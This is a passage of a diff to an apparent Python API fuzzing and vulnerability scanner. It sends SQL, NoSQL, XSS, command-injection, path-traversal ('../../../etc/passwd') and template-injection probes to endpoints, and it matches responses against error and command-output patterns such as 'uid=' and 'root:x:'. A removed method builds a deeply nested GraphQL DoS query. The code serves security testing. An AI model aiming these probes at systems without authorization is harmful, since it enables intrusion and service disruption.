+                        'type': injection_type,
+                        'severity': 'High' if injection_type == 'SQL Injection' else 'Medium',
+                        'endpoint': test_url,
+                        'description': f'{injection_type} vulnerability in parameter {param_name}',
+                        'evidence': f'Payload: {payload}'
+                    }
                     
             except Exception:
                 continue
         
-        return result
-
-    def _detect_injection_success(self, response: requests.Response, payload: str) -> bool:
-        """Detect if injection was successful"""
-        response_text = response.text.lower()
-        
-        # SQL injection indicators
-        if "'" in payload and any(indicator in response_text for indicator in [
-            'sql syntax', 'mysql', 'postgresql', 'oracle error',
-            'sqlite', 'database error', 'warning:', 'fatal error'
-        ]):
-            return True
-        
-        # XSS indicators
-        if '<script>' in payload and payload.lower() in response_text:
-            return True
-        
-        # File inclusion indicators
-        if '../' in payload and any(indicator in response_text for indicator in [
-            'root:x:', '/bin/bash', 'daemon:', '[boot loader]'
-        ]):
-            return True
-        
-        # Command injection indicators
-        if any(cmd in payload for cmd in ['ping', 'whoami', 'id']) and any(indicator in response_text for indicator in [
-            'uid=', 'gid=', 'ping statistics', 'packets transmitted'
-        ]):
-            return True
-        
-        return False
-
-    def _detect_auth_bypass(self, response: requests.Response, payload: Dict) -> bool:
-        """Detect authentication bypass success"""
-        # Check for successful authentication indicators
-        success_indicators = [
-            'welcome', 'dashboard', 'admin panel', 'logout',
-            'profile', 'settings', 'authenticated', 'token'
-        ]
-        
-        response_text = response.text.lower()
-        
-        # Successful response with auth indicators
-        if response.status_code == 200 and any(indicator in response_text for indicator in success_indicators):
-            return True
-        
-        # Check for admin/privileged access
-        if 'admin' in str(payload) and any(indicator in response_text for indicator in [
-            'admin', 'administrator', 'privileged', 'elevated'
-        ]):
-            return True
-        
-        return False
-
-    def _detect_graphql_injection(self, response: requests.Response, payload: str) -> bool:
-        """Detect GraphQL injection success"""
-        if response.status_code != 200:
-            return False
-        
-        try:
-            data = response.json()
-            
-            # Check for errors that indicate injection
-            if 'errors' in data:
-                error_text = str(data['errors']).lower()
-                if any(indicator in error_text for indicator in [
-                    'syntax error', 'parse error', 'sql', 'database'
-                ]):
-                    return True
-            
-            # Check for unexpected data in response
-            if 'data' in data and payload.lower() in str(data['data']).lower():
-                return True
-                
-        except Exception:
-            pass
-        
-        return False
-
-    def _detect_websocket_injection(self, response: str, message: str) -> bool:
-        """Detect WebSocket injection success"""
-        response_lower = response.lower()
-        
-        # Check for error messages indicating injection
-        error_indicators = [
-            'error', 'exception', 'syntax', 'parse',
-            'sql', 'database', 'unauthorized', 'admin'
-        ]
-        
-        # Check if injection payload appears in response
-        if any(payload in message for payload in self.injection_payloads):
-            if any(indicator in response_lower for indicator in error_indicators):
-                return True
-        
-        return False
-
-    def _extract_graphql_queries(self, schema_data: Dict) -> List[str]:
-        """Extract available queries from GraphQL schema"""
-        queries = []
-        
-        try:
-            query_type = schema_data.get('data', {}).get('__schema', {}).get('queryType', {})
-            fields = query_type.get('fields', [])
-            
-            for field in fields:
-                query_name = field.get('name', '')
-                if query_name:
-                    queries.append(f"query {{ {query_name} }}")
-                    
-        except Exception:
-            pass
-        
-        return queries
-
-    def _create_injection_query(self, base_query: str, payload: str) -> str:
-        """Create injection query from base query and payload"""
-        # Simple injection by adding payload as parameter
-        if '{' in base_query and '}' in base_query:
-            # Insert payload as a parameter
-            query_parts = base_query.split('{', 1)
-            if len(query_parts) == 2:
-                return f"{query_parts[0]}{{ {query_parts[1][:-1]}(input: \"{payload}\") }}"
-        
-        return base_query
-
-    def _test_rate_limiting(self, endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
-        """Test for rate limiting vulnerabilities"""
-        try:
-            # Send rapid requests
-            responses = []
-            for i in range(10):
-                response = self.session.get(endpoint.url, timeout=2)
-                responses.append(response.status_code)
-                time.sleep(0.1)  # Small delay
-            
-            # Check if rate limiting is not implemented
-            success_responses = len([r for r in responses if r == 200])
-            
-            if success_responses >= 8:  # Most requests succeeded
-                return {
-                    'type': 'Rate Limiting Bypass',
-                    'endpoint': endpoint.url,
-                    'evidence': f'{success_responses}/10 requests succeeded',
-                    'risk': 'DoS and resource exhaustion possible'
-                }
-                
-        except Exception:
-            pass
-        
         return None
-
-    def _test_graphql_dos(self, endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
-        """Test GraphQL depth-based DoS"""
-        try:
-            # Create deeply nested query
-            deep_query = {
-                "query": """
-                query {
-                    user {
-                        posts {
-                            comments {
-                                author {
-                                    posts {
-                                        comments {
-                                            author {
-                                                name
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
+    
+    def _test_payload_in_body(self, endpoint: str, payload: str, injection_type: str) -> Optional[Dict]:
+        """Test injection payload in POST body"""
+        # Test with JSON body
+        json_bodies = [
+            {'data': payload},
+            {'input': payload},
+            {'query': payload},
+            {'search': payload}
+        ]
+        
+        for body in json_bodies:
+            try:
+                response = self.session.post(endpoint, json=body, timeout=10)
+                
+                if self._detect_injection_success(response.text, injection_type, payload):
+                    return {
+                        'type': injection_type,
+                        'severity': 'High',
+                        'endpoint': endpoint,
+                        'description': f'{injection_type} vulnerability in POST body',
+                        'evidence': f'Payload: {payload}'
                     }
-                }
-                """
-            }
-            
-            start_time = time.time()
-            response = self.session.post(
-                endpoint.url,
-                json=deep_query,
-                headers={'Content-Type': 'application/json'},
-                timeout=10
-            )
-            execution_time = time.time() - start_time
-            
-            # If query takes too long or causes server error
-            if execution_time > 5 or response.status_code == 500:
-                return {
-                    'type': 'GraphQL Depth-based DoS',
-                    'endpoint': endpoint.url,
-                    'evidence': f'Query execution time: {execution_time:.2f}s',
-                    'risk': 'Server resource exhaustion'
-                }
-                
-        except Exception:
-            pass
+                    
+            except Exception:
+                continue
         
         return None
-
-    def generate_api_security_report(self, results: Dict[str, Any]) -> str:
-        """Generate comprehensive API security report"""
+    
+    def _detect_injection_success(self, response_text: str, injection_type: str, payload: str) -> bool:
+        """Detect if injection was successful"""
+        response_lower = response_text.lower()
         
+        if injection_type == 'SQL Injection':
+            sql_errors = [
+                'sql syntax', 'mysql_fetch', 'warning: mysql',
+                'postgresql query failed', 'sqlite_', 'oracle error'
+            ]
+            return any(error in response_lower for error in sql_errors)
+        
+        elif injection_type == 'NoSQL Injection':
+            nosql_errors = [
+                'mongodb', 'bson', 'objectid', 'collection'
+            ]
+            return any(error in response_lower for error in nosql_errors)
+        
+        elif injection_type == 'XSS':
+            return payload in response_text
+        
+        elif injection_type == 'Command Injection':
+            cmd_indicators = [
+                'uid=', 'gid=', 'total', 'drwx', 'volume serial number'
+            ]
+            return any(indicator in response_lower for indicator in cmd_indicators)
+        
+        return False
+    
+    def _fuzz_parameters(self, endpoint: str, method: str) -> Dict[str, Any]:
+        """Fuzz API parameters"""
+        results = {'vulnerabilities': []}
+        
+        # Common parameter names to test
+        param_names = [
+            'id', 'user_id', 'admin', 'debug', 'test', 'dev',
+            'limit', 'offset', 'page', 'size', 'count',
+            'format', 'type', 'mode', 'action', 'cmd'
+        ]
+        
+        # Parameter values that might cause issues
+        dangerous_values = [
+            '999999999',  # Large number
+            '-1',         # Negative number
+            '0',          # Zero
+            '../../../etc/passwd',  # Path traversal
+            '${7*7}',     # Expression injection
+            '{{7*7}}',    # Template injection
+            'true',       # Boolean
+            'false',      # Boolean
+            'null',       # Null
+            'undefined'   # Undefined
+        ]
+        
+        for param_name in param_names:
+            for value in dangerous_values:
+                try:
+                    if method == 'GET':
+                        test_url = f"{endpoint}?{param_name}={value}"
+                        response = self.session.get(test_url, timeout=10)
+                    else:
+                        data = {param_name: value}
+                        response = self.session.post(endpoint, json=data, timeout=10)
+                    
+                    # Check for interesting responses
+                    if response.status_code in [200, 500] and len(response.text) > 0:
+                        if self._check_parameter_vulnerability(response.text, value):
+                            results['vulnerabilities'].append({
+                                'type': 'Parameter Vulnerability',
+                                'severity': 'Medium',
+                                'endpoint': endpoint,
+                                'description': f'Parameter {param_name} accepts dangerous value',
+                                'evidence': f'Value: {value}, Response length: {len(response.text)}'
+                            })
+                
+                except Exception:
+                    continue
+        
+        return results
+    
+    def _check_parameter_vulnerability(self, response_text: str, test_value: str) -> bool:
+        """Check if parameter testing revealed vulnerability"""
+        # Look for error messages, stack traces, or reflected values
+        indicators = [
+            'error', 'exception', 'stack trace', 'warning',
+            'fatal', 'debug', 'traceback', test_value
+        ]
+        
+        response_lower = response_text.lower()
+        return any(indicator in response_lower for indicator in indicators)
+    
+    def _is_json_response(self, response) -> bool:
+        """Check if response is JSON"""
+        try:
+            response.json()
+            return True
+        except:
+            return False
+    
+    def _check_sensitive_data_exposure(self, response_text: str) -> bool:
+        """Check for sensitive data in response"""
+        sensitive_patterns = [
+            r'password["\']?\s*:\s*["\'][^"\']+["\']',
+            r'api[_-]?key["\']?\s*:\s*["\'][^"\']+["\']',
+            r'secret["\']?\s*:\s*["\'][^"\']+["\']',
+            r'token["\']?\s*:\s*["\'][^"\']+["\']',
+            r'ssn["\']?\s*:\s*["\'][^"\']+["\']',
+            r'credit[_-]?card["\']?\s*:\s*["\'][^"\']+["\']',
+            r'\b\d{16}\b',  # Credit card numbers
+            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN format
+            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'  # Email addresses
+        ]
+        
+        for pattern in sensitive_patterns:
+            if re.search(pattern, response_text, re.IGNORECASE):
+                return True
+        
+        return False
+    
+    def _check_verbose_errors(self, response_text: str) -> bool:
+        """Check for verbose error messages"""
+        error_indicators = [
+            'stack trace', 'traceback', 'exception in thread',
+            'caused by:', 'at java.', 'at com.', 'at org.',
+            'file not found', 'access denied', 'permission denied',
+            'internal server error', 'database error', 'sql error'
+        ]
+        
+        response_lower = response_text.lower()
+        return any(indicator in response_lower for indicator in error_indicators)
+
+    def generate_api_report(self, results: Dict[str, Any]) -> str:
+        """Generate comprehensive API fuzzing report"""
         report = f"""
 ═══════════════════════════════════════
-        API SECURITY ASSESSMENT
+          API FUZZING REPORT
 ═══════════════════════════════════════
 
-🎯 **Target:** {self.base_url}
-📡 **Endpoints Discovered:** {results['total_endpoints']}
-🔍 **Vulnerabilities Found:** {results['vulnerabilities_found']}
+🎯 TARGET: {self.base_url}
+📊 ENDPOINTS DISCOVERED: {results['total_endpoints']}
+🔍 VULNERABILITIES FOUND: {results['vulnerabilities_found']}
 
-📊 **Vulnerability Breakdown:**
-🔓 Authentication Bypasses: {results['authentication_bypasses']}
-💉 Injection Vulnerabilities: {results['injection_vulnerabilities']}
-⚡ Rate Limiting Issues: {len([r for r in results['detailed_results'] if any('Rate Limiting' in v.get('type', '') for v in r.get('vulnerabilities', []))])}
+📈 VULNERABILITY BREAKDOWN:
+├─ Authentication Bypasses: {results['authentication_bypasses']}
+├─ Injection Vulnerabilities: {results['injection_vulnerabilities']}
+├─ Information Disclosures: {results['information_disclosures']}
+└─ Rate Limit Bypasses: {results['rate_limit_bypasses']}
 
-🔍 **Endpoint Analysis:**
+🔍 DISCOVERED ENDPOINTS:
 """
         
-        # Group by endpoint type
-        endpoint_types = {}
-        for result in results['detailed_results']:
-            endpoint_type = result.get('type', 'Unknown')
-            if endpoint_type not in endpoint_types:
-                endpoint_types[endpoint_type] = 0
-            endpoint_types[endpoint_type] += 1
+        for i, endpoint in enumerate(self.discovered_endpoints[:10], 1):
+            report += f"{i:2d}. {endpoint}\n"
         
-        for endpoint_type, count in endpoint_types.items():
-            report += f"📡 {endpoint_type}: {count} endpoints\n"
+        if len(self.discovered_endpoints) > 10:
+            report += f"    ... and {len(self.discovered_endpoints) - 10} more endpoints\n"
         
-        # Top vulnerabilities
+        # Add top vulnerabilities
         if results['vulnerabilities_found'] > 0:
-            report += "\n🚨 **Critical Findings:**\n"
-            
+            report += "\n🚨 CRITICAL VULNERABILITIES:\n"
             vuln_count = 0
-            for result in results['detailed_results']:
-                for vuln in result.get('vulnerabilities', []):
-                    if vuln_count >= 5:  # Limit to top 5
-                        break
-                    vuln_count += 1
-                    
-                    report += f"\n{vuln_count}. **{vuln.get('type', 'Unknown')}**\n"
-                    report += f"   Endpoint: {vuln.get('endpoint', 'N/A')}\n"
-                    report += f"   Evidence: {vuln.get('evidence', 'N/A')}\n"
-                    if 'payload' in vuln:
-                        report += f"   Payload: {vuln['payload'][:50]}...\n"
+            
+            for endpoint_result in results['detailed_results']:
+                for vuln in endpoint_result.get('vulnerabilities', []):
+                    if vuln['severity'] in ['High', 'Critical'] and vuln_count < 5:
+                        vuln_count += 1
+                        report += f"{vuln_count:2d}. {vuln['type']} - {vuln['endpoint']}\n"
+                        report += f"    Description: {vuln['description']}\n"
+                        report += f"    Evidence: {vuln['evidence']}\n\n"
         
-        report += "\n═══════════════════════════════════════\n"
+        report += "═══════════════════════════════════════\n"
         return report
